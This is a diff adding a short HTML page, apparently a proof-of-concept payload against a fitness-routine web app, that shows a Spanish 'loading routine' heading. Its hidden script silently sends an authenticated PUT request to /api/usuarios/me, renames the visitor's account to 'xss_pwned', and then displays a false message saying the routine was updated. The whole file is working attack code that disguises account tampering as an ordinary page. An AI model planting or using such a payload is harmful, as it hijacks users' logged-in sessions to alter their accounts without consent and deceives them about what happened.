@@ -1,0 +1,15 @@
+<html>
+<body>
+<h1>Cargando rutina...</h1>
+<script>
+  fetch("/api/usuarios/me", {
+    method: "PUT",
+    credentials: "include",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({"username": "xss_pwned"})
+  }).then(r => r.json()).then(d => {
+    document.body.innerHTML = "<h1>Tu rutina se ha actualizado</h1>";
+  });
+</script>
+</body>
+</html>
